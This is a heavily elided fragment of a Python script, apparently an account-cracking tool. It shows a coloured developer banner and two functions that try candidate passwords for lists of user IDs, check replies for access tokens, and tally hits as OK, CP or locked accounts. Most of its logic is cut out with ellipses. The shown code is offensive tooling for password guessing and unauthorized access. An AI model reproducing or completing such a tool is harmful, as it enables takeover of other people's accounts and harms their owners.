...
#__________________[ HABIB INFO ]__________________#
os.system(f'clear')
...
{G1}──────────────────────────────────────────────────
{G1}[{A}✓{G1}]{A} DEVELOPER {G1}➢{A} SAFWAN ISLAM 
...
def randm(ids,psd):
    ...
    sys.stdout.write(f"\r\r{G1}[{A}SWAG-XD{G1}]-[{A}{loop}{G1}]-[{A}OK{G1}/{A}CP{G1}]-[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LOCK':
                	print(f'\r\r{S}[SAFU-LK] {uid} | {pas}');break
...
def M1(ids,names,psd):
    ...
    sys.stdout.write(f"\r\r{G1}[{A}SAFWAN-XD{G1}]-[{A}{loop}{G1}]-[{A}OK{G1}/{A}CP{G1}]-[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
